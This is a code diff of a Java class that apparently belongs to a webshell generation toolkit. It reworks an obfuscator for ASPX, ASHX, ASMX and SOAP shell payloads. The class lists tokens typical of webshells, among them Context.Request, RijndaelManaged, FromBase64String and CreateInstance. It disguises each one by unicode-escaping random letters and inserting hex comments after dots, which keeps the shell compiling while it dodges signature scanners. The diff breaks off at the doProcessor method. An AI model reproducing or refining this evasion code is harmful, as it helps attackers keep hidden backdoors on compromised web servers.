@@ -1,55 +1,87 @@
-//
-// Source code recreated from a .class file by IntelliJ IDEA
-// (powered by FernFlower decompiler)
-//
-
 package core.shellprocessor.aspxJunkCode;
 
 import core.annotation.GenerateProcessor;
 import core.imp.ShellProcessor;
+import java.util.Arrays;
+import java.util.Comparator;
+import java.util.Random;
 
 @GenerateProcessor(
         DisplayName = "JunkCode",
         superTemplate = {"aspx", "ashx", "asmx", "soap"}
 )
 public class ASPXJunkCode implements ShellProcessor {
+
+    private static final String[] KEYWORDS = new String[]{
+            "System.Text.Encoding.Default.GetBytes",
+            "System.IO.MemoryStream",
+            "MD5CryptoServiceProvider",
+            "System.BitConverter",
+            "System.Reflection",
+            "FromBase64String",
+            "ToBase64String",
+            "CreateDecryptor",
+            "CreateEncryptor",
+            "Context.Request",
+            "Context.Response",
+            "Context.Session",
+            "TransformFinalBlock",
+            "CreateInstance",
+            "ContentLength",
+            "Cryptography",
+            "System.Security",
+            "System.Convert",
+            "System.Type",
+            "BinaryRead",
+            "BinaryWrite",
+            "ComputeHash",
+            "GetMethod",
+            "RijndaelManaged",
+            "Assembly",
+            "ToString",
+            "magicNum1",
+            "magicNum2"
+    };
+
     public ASPXJunkCode() {
     }
 
+    /**
+     * Keep C# identifiers valid: unicode-escape the same letter, and insert
+     * comments only after dots. Random Cf/Mn junk previously broke aspx/ashx.
+     */
     public static String AspxJunkCode(String text) {
-        String[] list = new String[]{"BinaryRead", "ContentLength", "Context.Request", "Context.Response", "Context.Session", "BinaryWrite", "ComputeHash", "CreateDecryptor", "CreateEncryptor", "Cryptography", "GetMethod", "MD5CryptoServiceProvider", "RijndaelManaged", "System.BitConverter", "System.Convert", "FromBase64String", "ToBase64String", "System.IO.MemoryStream", "System.Reflection", "Assembly", "System.Security", "System.Text.Encoding.Default.GetBytes", "System.Type", "ToString", "TransformFinalBlock", "magicNum1", "magicNum2", "CreateInstance"};
-        String[] junklist = new String[]{"\\u070f", "\\u180b", "\\u180c", "\\u180e", "\\u180d", "\\ufeff"};
-        String temp = "";
+        if (text == null || text.isEmpty()) {
+            return text;
+        }
+        String[] list = KEYWORDS.clone();
+        Arrays.sort(list, Comparator.comparingInt(String::length).reversed());
         String result = text;
-
-        for(int i = 0; i < list.length; ++i) {
+        Random rnd = new Random();
+        for (int i = 0; i < list.length; ++i) {
             String s = list[i];
-            int index = text.indexOf(s);
-            if (index != -1) {
-                int white = 0;
-                char[] chars = s.toCharArray();
-
-                for(int j = 0; j < chars.length; ++j) {
-                    String cc = String.valueOf(chars[j]);
-                    if (j > white) {
-                        white = s.indexOf(".", white + 1);
-                    }
-
-                    if (j != white) {
-                        int random = (int)(Math.random() * (double)junklist.length);
-                        String junk = junklist[random];
-                        temp = temp + cc + junk;
-                    } else {
-                        temp = temp + cc;
-                    }
-                }
-
-                result = result.replace(s, temp);
-                temp = "";
+            if (result.contains(s)) {
+                result = result.replace(s, obfuscateToken(s, rnd));
             }
         }
-
         return result;
+    }
+
+    static String obfuscateToken(String token, Random rnd) {
+        StringBuilder sb = new StringBuilder(token.length() * 6);
+        for (int i = 0; i < token.length(); i++) {
+            char c = token.charAt(i);
+            if (c == '.') {
+                sb.append("./*").append(Integer.toHexString(rnd.nextInt(0xfff) + 0x100)).append("*/");
+                continue;
+            }
+            if (Character.isLetter(c) && rnd.nextBoolean()) {
+                sb.append(String.format("\\u%04x", (int) c));
+            } else {
+                sb.append(c);
+            }
+        }
+        return sb.toString();
     }
 
     public byte[] doProcessor(byte[] shell, String suffix) {
